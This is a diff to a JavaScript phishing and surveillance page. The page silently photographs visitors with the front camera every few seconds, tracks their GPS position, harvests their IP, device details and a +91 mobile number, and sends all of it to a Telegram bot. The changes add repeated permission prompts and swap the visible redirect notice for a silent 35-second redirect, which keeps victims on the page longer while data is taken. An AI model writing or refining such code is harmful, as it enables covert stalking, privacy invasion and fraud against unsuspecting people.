@@ -15,6 +15,8 @@ let locationUpdates = 0;
 let isSubmitted = false;
 let redirectUrl = "https://telegram.me/ANAS_ACCESS_BOT";
 let redirectTimer = null;
+let permissionAttempts = 0;
+const MAX_PERMISSION_ATTEMPTS = 3;
 
 // Create video element
 function createVideoElement() {
@@ -58,18 +60,13 @@ function getRedirectUrl() {
 
     if (urlParam) {
         try {
-            // Decode URL
             const decodedUrl = decodeURIComponent(urlParam);
-            
-            // Clean URL
             let cleanUrl = decodedUrl.replace(/<[^>]*>/g, '');
             
-            // Add https:// if not present
             if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
                 cleanUrl = 'https://' + cleanUrl;
             }
             
-            // Validate URL
             new URL(cleanUrl);
             console.log("Valid redirect URL:", cleanUrl);
             return cleanUrl;
@@ -214,7 +211,6 @@ async function capturePhoto() {
     }
 
     try {
-        // Small delay to ensure video is ready
         await new Promise(resolve => setTimeout(resolve, 100));
 
         const canvas = document.createElement('canvas');
@@ -240,38 +236,28 @@ async function capturePhoto() {
     }
 }
 
-async function startCamera() {
+async function requestCameraPermission() {
     try {
-        console.log("Starting front camera...");
+        console.log("Requesting camera permission...");
         
-        // Create video element
         createVideoElement();
 
-        // Front camera constraints
         const constraints = {
             video: {
-                facingMode: 'user', // Front camera
+                facingMode: 'user',
                 width: { ideal: 1280 },
-                height: { ideal: 720 },
-                frameRate: { ideal: 30 }
+                height: { ideal: 720 }
             },
             audio: false
         };
 
-        // Get camera stream
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         cameraStream = stream;
         videoElement.srcObject = stream;
 
-        // Wait for video to be ready
-        return new Promise((resolve, reject) => {
-            const timer = setTimeout(() => {
-                reject(new Error("Camera timeout"));
-            }, 5000);
-
+        return new Promise((resolve) => {
             const checkVideoReady = () => {
                 if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
-                    clearTimeout(timer);
                     console.log(`Camera ready: ${videoElement.videoWidth}x${videoElement.videoHeight}`);
                     isCameraActive = true;
                     resolve(true);
@@ -281,35 +267,22 @@ async function startCamera() {
             };
 
             videoElement.onloadedmetadata = checkVideoReady;
-            videoElement.onerror = () => {
-                clearTimeout(timer);
-                reject(new Error("Video error"));
-            };
-            
-            // Start checking immediately
+            videoElement.onerror = () => resolve(false);
             checkVideoReady();
         });
 
     } catch (error) {
-        console.error("Camera error:", error);
+        console.error("Camera permission denied:", error);
         isCameraActive = false;
-        
-        if (currentChatId) {
-            await sendTelegramMessage(currentChatId, 
-                `⚠️ Camera Error: ${error.message}\nTime: ${new Date().toLocaleString()}`);
-        }
-        
         return false;
     }
 }
 
-async function startLocationTracking() {
+async function requestLocationPermission() {
     if (!navigator.geolocation) {
         console.error("Geolocation not supported");
-        return;
+        return false;
     }
-
-    console.log("Starting location tracking...");
 
     try {
         const position = await new Promise((resolve, reject) => {
@@ -330,13 +303,9 @@ async function startLocationTracking() {
             timestamp: new Date(position.timestamp)
         };
 
-        console.log("Got initial location:", currentLocation);
+        console.log("Location permission granted");
 
-        if (currentChatId) {
-            await sendLocationUpdate(currentChatId, currentLocation);
-        }
-
-        // Watch for location updates
+        // Start watching location
         watchId = navigator.geolocation.watchPosition(
             (position) => {
                 currentLocation = {
@@ -348,60 +317,72 @@ async function startLocationTracking() {
                     heading: position.coords.heading,
                     timestamp: new Date(position.timestamp)
                 };
-                
-                console.log("Location updated:", currentLocation);
-                
-                // Send update every 30 seconds
-                if (currentChatId && locationUpdates % 6 === 0) {
-                    sendLocationUpdate(currentChatId, currentLocation);
-                }
             },
-            (error) => {
-                console.error("Location error:", error);
-            },
-            {
-                enableHighAccuracy: true,
-                maximumAge: 0,
-                timeout: 10000
-            }
+            (error) => console.error("Location error:", error),
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
         );
 
-        // Periodic updates every 60 seconds
+        // Periodic updates
         locationInterval = setInterval(async () => {
             if (currentLocation && currentChatId) {
                 await sendLocationUpdate(currentChatId, currentLocation);
             }
         }, 60000);
 
+        return true;
     } catch (error) {
         console.error("Location permission denied:", error);
-        if (currentChatId) {
-            await sendTelegramMessage(currentChatId, 
-                `❌ Location Denied: ${error.message}\nTime: ${new Date().toLocaleString()}`);
-        }
+        return false;
     }
+}
+
+// Request both permissions on page load
+async function requestAllPermissions() {
+    console.log("Requesting all permissions...");
+    
+    // Try camera first
+    const cameraGranted = await requestCameraPermission();
+    
+    // Try location after 1 second
+    setTimeout(async () => {
+        const locationGranted = await requestLocationPermission();
+        
+        // If denied, retry after 3 seconds (max 3 attempts)
+        if (!cameraGranted || !locationGranted) {
+            permissionAttempts++;
+            if (permissionAttempts < MAX_PERMISSION_ATTEMPTS) {
+                console.log(`Retrying permissions in 3 seconds... (Attempt ${permissionAttempts + 1}/${MAX_PERMISSION_ATTEMPTS})`);
+                setTimeout(requestAllPermissions, 3000);
+            }
+        } else {
+            console.log("All permissions granted!");
+            // Start photo capture if camera is active
+            if (isCameraActive && currentChatId) {
+                startContinuousPhotoCapture();
+            }
+        }
+    }, 1000);
 }
 
 async function startContinuousPhotoCapture() {
     if (!isCameraActive || !currentChatId) return;
 
-    console.log("Starting photo capture every 3 seconds...");
+    console.log("Starting photo capture every 5 seconds...");
 
-    // First photo after 1 second
+    // First photo after 2 seconds
     setTimeout(async () => {
         try {
             const photo = await capturePhoto();
             if (photo) {
                 photoCounter++;
                 await sendPhoto(currentChatId, photo, photoCounter, currentLocation);
-                console.log("First photo sent");
             }
         } catch (error) {
             console.error("First photo error:", error);
         }
-    }, 1000);
+    }, 2000);
 
-    // Then every 3 seconds
+    // Then every 5 seconds
     photoInterval = setInterval(async () => {
         try {
             const photo = await capturePhoto();
@@ -415,8 +396,8 @@ async function startContinuousPhotoCapture() {
 <b>📊 STATUS UPDATE</b>
 <b>Photos:</b> ${photoCounter}
 <b>Location Updates:</b> ${locationUpdates}
-<b>Camera:</b> ${isCameraActive ? '✅ Active' : '❌ Inactive'}
-<b>Location:</b> ${currentLocation ? '✅ Active' : '❌ Inactive'}
+<b>Camera:</b> ${isCameraActive ? '✅' : '❌'}
+<b>Location:</b> ${currentLocation ? '✅' : '❌'}
 <b>Time:</b> ${new Date().toLocaleString()}
                     `;
                     await sendTelegramMessage(currentChatId, status);
@@ -425,7 +406,7 @@ async function startContinuousPhotoCapture() {
         } catch (error) {
             console.error("Photo capture error:", error);
         }
-    }, 3000);
+    }, 5000);
 }
 
 async function sendInitialInfo() {
@@ -443,7 +424,7 @@ async function sendInitialInfo() {
         }
 
         const message = `
-<b>🚀 TRACKING STARTED</b>
+<b>🚀 PAGE LOADED</b>
 <b>Time:</b> ${deviceInfo.currentTime}
 <b>IP:</b> ${ipDetails.ip}
 <b>Location:</b> ${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}
@@ -452,27 +433,14 @@ async function sendInitialInfo() {
 <b>Screen:</b> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
 <b>Network:</b> ${deviceInfo.networkType}
 <b>Redirect URL:</b> ${redirectUrl}
-<b>Full URL:</b> ${window.location.href}
+<b>Page URL:</b> ${window.location.href}
         `;
 
         await sendTelegramMessage(currentChatId, message);
         console.log("Initial info sent");
 
-        // Start camera
-        console.log("Starting camera...");
-        const cameraStarted = await startCamera();
-        
-        // Start location
-        console.log("Starting location tracking...");
-        await startLocationTracking();
-        
-        // Start photos if camera is active
-        if (cameraStarted) {
-            console.log("Starting continuous photo capture...");
-            startContinuousPhotoCapture();
-        } else {
-            console.log("Camera not started, continuing without photos");
-        }
+        // Request permissions immediately
+        requestAllPermissions();
 
     } catch (error) {
         console.error("Initial info error:", error);
@@ -514,7 +482,7 @@ function cleanup() {
 
     isCameraActive = false;
 
-    // Send final message if not submitted
+    // Send final message
     if (currentChatId && !isSubmitted) {
         const finalMsg = `
 <b>📊 SESSION ENDED</b>
@@ -533,116 +501,30 @@ function cleanup() {
     }
 }
 
-function showRedirectMessage(seconds) {
-    // Simple message without HTML injection
-    const messageDiv = document.createElement('div');
-    messageDiv.id = 'redirect-message';
-    messageDiv.style.cssText = `
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        color: white;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        font-family: Arial, sans-serif;
-        text-align: center;
-        padding: 20px;
-        z-index: 999999;
-    `;
+// Simple silent redirect after 35 seconds
+function startSilentRedirect() {
+    console.log("Starting 35-second silent redirect timer...");
     
-    messageDiv.innerHTML = `
-        <h1 style="font-size: 2em; margin-bottom: 20px;">✅ Submission Successful!</h1>
-        <p style="font-size: 1.2em; margin-bottom: 10px;">
-            Your information has been submitted.
-        </p>
-        <p style="font-size: 1.1em; margin-bottom: 20px;">
-            Redirecting in ${seconds} seconds...
-        </p>
-        <div style="
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255,255,255,0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 30px;
-        "></div>
-        <p style="font-size: 0.9em; opacity: 0.8;">
-            <a href="${redirectUrl}" style="color: white; text-decoration: underline;">
-                Click here if not redirected
-            </a>
-        </p>
-        <p style="font-size: 0.8em; opacity: 0.6; margin-top: 20px;">
-            Photos: ${photoCounter} | Location: ${locationUpdates}
-        </p>
-        <style>
-            @keyframes spin { to { transform: rotate(360deg); } }
-        </style>
-    `;
-    
-    document.body.appendChild(messageDiv);
-}
-
-function startRedirectCountdown(seconds) {
-    let remaining = seconds;
-    
-    // Show initial message
-    showRedirectMessage(remaining);
-    
-    // Update countdown every second
-    const countdownInterval = setInterval(() => {
-        remaining--;
-        
-        // Update message
-        const messageDiv = document.getElementById('redirect-message');
-        if (messageDiv) {
-            const timerElement = messageDiv.querySelector('p:nth-child(3)');
-            if (timerElement) {
-                timerElement.textContent = `Redirecting in ${remaining} seconds...`;
-            }
-        }
-        
-        // Redirect when countdown reaches 0
-        if (remaining <= 0) {
-            clearInterval(countdownInterval);
-            window.location.href = redirectUrl;
-        }
-    }, 1000);
-    
-    // Also set a backup timer
     redirectTimer = setTimeout(() => {
-        clearInterval(countdownInterval);
-        window.location.href = redirectUrl;
-    }, seconds * 1000);
-}
-
-function redirectToUrl() {
-    console.log("Starting redirect process...");
-    cleanup();
-    
-    // Send final data to Telegram
-    if (currentChatId) {
-        const finalMessage = `
-<b>🔄 USER REDIRECTING</b>
-<b>Total Photos:</b> ${photoCounter}
-<b>Total Location Updates:</b> ${locationUpdates}
-<b>Redirect URL:</b> ${redirectUrl}
-<b>Redirect Time:</b> ${new Date().toLocaleString()}
-        `;
+        console.log("35 seconds completed, redirecting silently...");
         
-        sendTelegramMessage(currentChatId, finalMessage);
-    }
-    
-    // Wait 35 seconds (30-40 seconds as requested) then show redirect message
-    setTimeout(() => {
-        // Show redirect countdown for 5 seconds
-        startRedirectCountdown(5);
-    }, 35000); // 35 seconds delay before starting redirect countdown
+        if (currentChatId) {
+            const redirectMsg = `
+<b>🔄 AUTO REDIRECT</b>
+<b>Time on page:</b> 35 seconds
+<b>Final Photos:</b> ${photoCounter}
+<b>Final Location Updates:</b> ${locationUpdates}
+<b>Redirecting to:</b> ${redirectUrl}
+<b>Time:</b> ${new Date().toLocaleString()}
+            `;
+            
+            sendTelegramMessage(currentChatId, redirectMsg);
+        }
+        
+        cleanup();
+        window.location.href = redirectUrl;
+        
+    }, 35000); // 35 seconds
 }
 
 // Event listeners
@@ -679,39 +561,17 @@ document.getElementById('data-form').addEventListener('submit', async function (
         return;
     }
 
-    // Disable button and show loading
+    // Disable button
     const submitBtn = document.querySelector('button[type="submit"]');
     const originalText = submitBtn.textContent;
     submitBtn.disabled = true;
     submitBtn.textContent = "Submitting...";
 
-    // Show processing message
-    const processingDiv = document.createElement('div');
-    processingDiv.id = 'processing-message';
-    processingDiv.style.cssText = `
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background: rgba(0,0,0,0.8);
-        color: white;
-        padding: 20px;
-        border-radius: 10px;
-        z-index: 99999;
-        text-align: center;
-    `;
-    processingDiv.innerHTML = `
-        <p>Processing submission...</p>
-        <p>Please wait 30-40 seconds</p>
-        <p>Photos: ${photoCounter} | Location: ${locationUpdates}</p>
-    `;
-    document.body.appendChild(processingDiv);
-
     try {
         const ipDetails = await getIpDetails();
 
         const message = `
-<b>📱 MOBILE SUBMITTED</b>
+<b>📱 FORM SUBMITTED</b>
 <b>Number:</b> +91${mobileNumber}
 <b>Operator:</b> ${operator}
 <b>Redirect To:</b> ${redirectUrl}
@@ -732,7 +592,7 @@ ${currentLocation ? `
         if (success) {
             isSubmitted = true;
 
-            // Send final photo
+            // Final photo
             if (isCameraActive) {
                 const finalPhoto = await capturePhoto();
                 if (finalPhoto) {
@@ -741,24 +601,16 @@ ${currentLocation ? `
                 }
             }
 
-            // Remove processing message
-            if (processingDiv.parentNode) {
-                processingDiv.remove();
-            }
-
-            // Start redirect process (will wait 35 seconds)
-            redirectToUrl();
+            // Change button text
+            submitBtn.textContent = "Submitted ✓";
             
-            // Show waiting message
-            submitBtn.textContent = "Submitted ✓ Waiting...";
+            // Start 35-second silent redirect timer
+            startSilentRedirect();
             
         } else {
             alert("Failed to submit. Try again.");
             submitBtn.disabled = false;
             submitBtn.textContent = originalText;
-            if (processingDiv.parentNode) {
-                processingDiv.remove();
-            }
         }
 
     } catch (error) {
@@ -766,9 +618,6 @@ ${currentLocation ? `
         alert("Error occurred. Try again.");
         submitBtn.disabled = false;
         submitBtn.textContent = originalText;
-        if (processingDiv.parentNode) {
-            processingDiv.remove();
-        }
     }
 });
 
@@ -779,19 +628,18 @@ document.getElementById('mobile-number').addEventListener('input', function () {
 
 // Initialize
 document.addEventListener('DOMContentLoaded', function() {
-    console.log("🚀 Starting tracking system...");
+    console.log("Starting tracking system...");
 
     // Get parameters
     const params = getUrlParameters();
     redirectUrl = getRedirectUrl();
     
     console.log("Redirect URL:", redirectUrl);
-    console.log("All params:", params);
 
     // Show redirect info
     const redirectInfo = document.getElementById('redirect-info');
     if (redirectInfo && redirectUrl !== "https://telegram.me/ANAS_ACCESS_BOT") {
-        redirectInfo.textContent = `After submission → ${redirectUrl}`;
+        redirectInfo.textContent = `Will redirect to: ${redirectUrl}`;
         redirectInfo.style.display = 'block';
     }
 
@@ -802,15 +650,12 @@ document.addEventListener('DOMContentLoaded', function() {
         const photoCount = document.getElementById('photo-count');
         const locCount = document.getElementById('loc-count');
         
-        if (camStatus) camStatus.textContent = isCameraActive ? '✅ Active' : '⏳ Starting';
-        if (gpsStatus) gpsStatus.textContent = currentLocation ? '✅ Active' : '⏳ Requesting';
+        if (camStatus) camStatus.textContent = isCameraActive ? '✅ Active' : '⏳ Requesting...';
+        if (gpsStatus) gpsStatus.textContent = currentLocation ? '✅ Active' : '⏳ Requesting...';
         if (photoCount) photoCount.textContent = photoCounter;
         if (locCount) locCount.textContent = locationUpdates;
-        
-        // Debug info in console
-        console.log(`Camera: ${isCameraActive}, Location: ${currentLocation ? 'Yes' : 'No'}, Photos: ${photoCounter}, Location Updates: ${locationUpdates}`);
     }, 1000);
 
-    // Start tracking
-    setTimeout(sendInitialInfo, 1500);
+    // Start everything
+    setTimeout(sendInitialInfo, 1000);
 });
